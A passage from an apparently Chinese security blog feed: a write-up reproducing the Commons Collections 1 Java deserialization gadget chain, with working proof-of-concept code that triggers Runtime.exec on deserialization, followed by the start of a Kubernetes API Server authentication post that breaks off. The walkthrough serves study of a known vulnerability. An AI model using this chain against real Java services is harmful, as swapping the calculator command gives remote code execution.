class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="jdk源码关联"><a href="#jdk源码关联" class="headerlink" title="jdk源码关联"></a>jdk源码关联</h5><p>这个时候我们继续向上寻找调用链，看哪些类调用了<code>setValue</code>方法，按照流程，我应该能找到在<code>AnnotationInvocationHandler</code>这个类的<code>readObject</code>方法里面调用了<code>setValue</code>方法，可是找了一圈，并没有。。。我以为是我jdk版本的问题，于是在jdk下面查看，路径是<code>rt.jar</code>下面的<code>sun.reflect.annotation</code>，发现这个类不是源代码，所以查找调用的时候不会出现。</p><p>对于这个问题我找到了一个相对合理的解答：因为sun包是hotspot虚拟机中java.<em> 和javax.</em>的底层实现。因为包含在rt中，所以我们也可以调用。但是因为不是sun对外公开承诺的接口，所以根据实现的需要随时增减，因此在不同版本的hotspot中可能是不同的，而且在其他的jdk实现中是没有的，调用这些类，可能不会向后兼容，所以一般不推荐使用。因此如果我们需要查看<code>rt.jar</code>包下的源码就需要进行源码关联。</p><p>JDK-7u6源代码地址：<a href="http://jdk7src.sourceforge.net" target="_blank" rel="noopener">http://jdk7src.sourceforge.net</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/24.png" alt="24"></p><p>下载好对应JDK版本之后，在IDEA中就可以设置。进入<code>File-&gt;Project Structrue-&gt;SDKs-&gt;Sourcepath</code>中添加即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/11.png" alt="11"></p><p>这个时候我们再次查看<code>AnnotationInvocationHandler</code>这个类，发现已经是源代码文件了，同样也在<code>setValue</code>放的的调用类中成功找到了这个类</p><p><img src="/2021/10/27/Java-CC1链复现与分析/12.png" alt="12"></p><h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>现在我们可以继续修改我们上面写的例子，将<code>AnnotationInvocationHandler</code>类加进去，尝试实例化这个类，但是由于该类不是<code>public</code>的，不能直接在外部调用，因此需要用到反射去获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor annotationInvocationHandler = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = annotationInvocationHandler.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="遇到的三个问题"><a href="#遇到的三个问题" class="headerlink" title="遇到的三个问题"></a>遇到的三个问题</h5><p>这里就会遇到三个问题，第一个问题是<code>setValue</code>，在上面的例子中我们<code>setValue</code>的值直接传入的是一个<code>Runtime</code>对象，但是在<code>AnnotationInvocationHandler</code>类中，这个传入的值并不是我们可控的。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/13.png" alt="13"></p><p>第二个问题是对于<code>Runtime</code>类，它并不是可序列化的，因为它没有继承<code>Serializable</code>接口，因此我们也需要通过反射来实现。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/14.png" alt="14"></p><p>第三个问题是进入<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法中的<code>setValue</code>方法需要满足两个if条件。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/15.png" alt="15"></p><h5 id="反射调用Runtime"><a href="#反射调用Runtime" class="headerlink" title="反射调用Runtime"></a>反射调用Runtime</h5><p>我们先解决第二个问题，将<code>Runtime</code>对象通过反射实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>; <span class="comment">//通过反射获取到字节码对象</span></span><br><span class="line">        Method getRuntimeMethod = c.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>); <span class="comment">//获取getRuntime静态方法</span></span><br><span class="line">        Runtime r = (Runtime) getRuntimeMethod.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>); <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Method execMethod = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//反射调用exec方法</span></span><br><span class="line">        execMethod.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们把这个反射调用改成<code>InvokerTransformer</code>的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;).transform(Runtime.class);</span><br><span class="line">        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>我们可以发现，实际上是对<code>InvokerTransformer</code>类的<code>transform</code>方法连续调用了三次，不由想到在之前的<code>Transformer</code>的实现类中有一个<code>ChainedTransformer</code>，在它的<code>transform</code>方法中就是一个循环调用的形式。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/16.png" alt="16"></p><p>因此我们尝试使用<code>ChainedTransformer</code>类调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">      chainedTransformer.transform(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Target-class"><a href="#Target-class" class="headerlink" title="Target.class"></a>Target.class</h5><p>接着我们继续修改两个if判断的问题。在第一个if之前首先会遍历我们传入的map并将key赋给name，此时我们拿到的name就是在map中put的<code>key</code>，之后会通过<code>memberTypes.get</code>方法获取name，将值赋给memberType。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/17.png" alt="17"></p><p>由于我们现在传入的是<code>Override.class</code>，在<code>Override</code>中并没有存在成员方法，因此在get的时候就拿不到任何值，所以得到的<code>memberType</code>就为空。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/18.png" alt="18"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/20.png" alt="20"></p><p>因此我们需要找一个有成员方法的class，并将map传入的<code>key</code>值改为成员方法的名字，才可以进入第一层if判断，所以我们使用<code>Target.class</code>代替，并将<code>map.put</code>的<code>key</code>值改为<code>value</code></p><p><img src="/2021/10/27/Java-CC1链复现与分析/19.png" alt="19"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/21.png" alt="21"></p><p>在第二个判断语句中使用<code>isInstance</code>判断是否可以强转，这个判断很明显是<code>false</code>,取反之后正好可以让我们进入第二层if判断，从而执行<code>setValue</code>方法</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>现在我们接着解决上面的第一个问题，就是需要将<code>setValue</code>中的代理替换成我们的<code>Runtime.class</code>，可以通过<code>ConstantTransformer</code>实现。前面讲到了<code>ConstantTransformer</code>的<code>transform</code>方法接收一个输入并返回一个常量，因此我们只需要传入<code>Runtime.class</code>即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/22.png" alt="22"></p><h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map.Entry.setValue()</span><br><span class="line">  TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">"value"</span>,<span class="string">"aaa"</span>);</span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       annotationInvocationhdlConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object o = annotationInvocationhdlConstructor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">       serialize(o);</span><br><span class="line">       unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li><li><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></li><li><a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></li><li><a href="https://www.buaq.net/go-75937.html" target="_blank" rel="noopener">https://www.buaq.net/go-75937.html</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Apache-Commons-Collections&quot;&gt;&lt;a href=&quot;#Apache-Commons-Collections&quot; class=&quot;headerlink&quot; title=&quot;Apache Commons Collections&quot;&gt;&lt;/a&gt;Apache C
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes安全</title>
    <link href="elssm.github.io/2021/10/25/Kubernetes%E5%AE%89%E5%85%A8/"/>
    <id>elssm.github.io/2021/10/25/Kubernetes安全/</id>
    <published>2021-10-25T07:17:36.000Z</published>
    <updated>2021-10-26T08:01:47.714Z</updated>
    
    <content type="html"><![CDATA[<h4 id="机制说明"><a href="#机制说明" class="headerlink" title="机制说明"></a>机制说明</h4><p>Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是一个很重要的任务，<code>API Server</code>是集群内部各个组件通信的中介，也是外部控制的入口，因此Kubernetes的安全机制基本就是围绕保护<code>API Server</code>来设计的，在Kubernetes中，采用了认证(Authentication)、鉴权(Authorization)、准入控制(Admission Controll)三步来保证<code>API Server</code>的安全。</p><h4 id="Kubernetes-API访问控制"><a href="#Kubernetes-API访问控制" class="headerlink" title="Kubernetes API访问控制"></a>Kubernetes API访问控制</h4><p>用户使用<code>kubectl</code>、客户端库或构造REST请求来访问<code>Kubernetes API</code>。用户和<code>Kubernetes</code>服务账户都可以被鉴权访问API。当请求到达API时，会经历多个阶段，如下图所示</p><p><img src="/2021/10/25/Kubernetes安全/4.png" alt="4"></p><p>在典型的Kubernetes集群中，API服务器在442端口上提供服务，受TLS保护，API服务器出出示证书。该证书可以使用私有证书颁发机构（CA）签名，也可以基于链接到公认的CA的公钥基础架构签名。如果你的集群使用私有证书颁发机构，你需要在客户端的<code>~/.kube/config</code>文件中提供该证书的副本，以便你可以信任该链接并确认连接没有被拦截。</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>在Kubernetes中，认证分为下面三种</p><ul><li>HTTP Token认证：通过一个Token来识别合法用户<ul><li>HTTP Token的认证是用一个很长的特殊编码方式的并且难以被模仿的字符串，即Token来表达客户的一种方式，Token是一个很长的很复杂的字符串，每一个Token对一个一个用户名存放在<code>API Server</code>能访问的文件中，当客户端发起API调用请求时，需要在<code>HTTP Header</code>里放入Token</li></ul></li><li>HTTP Base认证：通过用户名+密码的方式认证<ul><li>用户名+密码采用<code>Base64</code>算法进行编码后的字符串放在<code>HTTP Request</code>中的<code>Heather Authorization</code>域里发送给服务端，服务端收到后进行编码，获取用户名及密码。</li></ul></li><li>HTTPS证书认证：基于CA根证书签名的客户端身份认证方式。这种方式最为严格，对于上面的两种方式，相当于只做了服务端认证客户端，并没有做客户端对服务端的认证。</li></ul><h5 id="需要认证的节点"><a href="#需要认证的节点" class="headerlink" title="需要认证的节点"></a>需要认证的节点</h5><ul><li>Kubernetes组件对<code>API Server</code>的访问：<code>kubectl</code>、<code>Controller Manager</code>、<code>Scheduler</code>、<code>kubelet</code>、<code>kube-proxy</code></li><li>Kubernetes管理的Pod对容器的访问：Pod（dashboard也是以Pod形式运行）</li></ul><h5 id="安全性说明"><a href="#安全性说明" class="headerlink" title="安全性说明"></a>安全性说明</h5><ul><li><code>Controller Manager</code>、<code>Scheduler</code>与<code>API Server</code>在同一台机器，所以直接使用<code>API Server</code>的非安全端口访问,<code>--insecure-bind-address=127.0.0.1</code></li><li><code>kubectl</code>、<code>kubelet</code>、<code>kube-proxy</code>访问<code>API Server</code>都需要证书进行HTTPS双向认证</li></ul><h5 id="证书颁发"><a href="#证书颁发" class="headerlink" title="证书颁发"></a>证书颁发</h5><ul><li>手动签发：通过Kubernetes集群根CA进行签发HTTPS证书</li><li>自动签发：<code>kubelet</code>首次访问<code>API Server</code>时，使用Token做认证，通过后，<code>Controller Manager</code>会为<code>kubelet</code>生成一个证书，以后的访问都是用证书做认证。</li></ul><h5 id="kubeconfig"><a href="#kubeconfig" class="headerlink" title="kubeconfig"></a>kubeconfig</h5><p>kubeconfig文件包含集群参数(CA证书，<code>API Server</code>地址)，客户端参数(生成的证书和私钥)，集群的context信息(集群名称、用户名)。Kubernetes组件通过启动时指定不同的kubeconfig文件可以切换到不同的集群。</p><p>查看kubeconfig文件</p><p><img src="/2021/10/25/Kubernetes安全/1.png" alt="1"></p><h5 id="ServiceAccount"><a href="#ServiceAccount" class="headerlink" title="ServiceAccount"></a>ServiceAccount</h5><p>Pod中的容器访问<code>API Server</code>，因为Pod的创建、销毁是动态的，因此要为它手动生成证书就比较麻烦，Kubernetes使用了SA解决Pod访问<code>API Server</code>的认证问题。</p><h5 id="Secret与SA的关系"><a href="#Secret与SA的关系" class="headerlink" title="Secret与SA的关系"></a>Secret与SA的关系</h5><p>Kubernetes设计了一种资源对象叫做Secret，分为两类，一种是用于<code>ServiceAccount</code>的<code>server-account-token</code>，另一种是用于保存用户自定义保密信息的<code>Opaque</code>。<code>ServiceAccount</code>中包含三个部分。Token、ca.crt、namespace</p><ul><li>Token是使用<code>API Server</code>私钥签名的JWT，用于访问<code>API Server</code>时，Server端认证</li><li>ca.crt根证书，用于Client端验证<code>API Server</code>发送的证书</li><li>namespace标识这个<code>service-account-token</code>的作用域名空间</li></ul><p>查看<code>ServiceAccount</code></p><p>默认情况下，每个namespace都会有一个<code>ServiceAccount</code>，如果Pod在创建时没有指定<code>ServiceAccount</code>，就会使用Pod所属的namespace的<code>ServiceAccount</code>。默认的挂载目录是<code>/run/secrets/kubernetes.io/serviceaccount/</code></p><p>首先我们查看一下当前存在的命名空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro .kube % kubectl get ns</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   18d</span><br><span class="line">kube-node-lease   Active   18d</span><br><span class="line">kube-public       Active   18d</span><br><span class="line">kube-system       Active   18d</span><br></pre></td></tr></table></figure><p>接着查看命名空间为<code>kube-system</code>下的pod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro 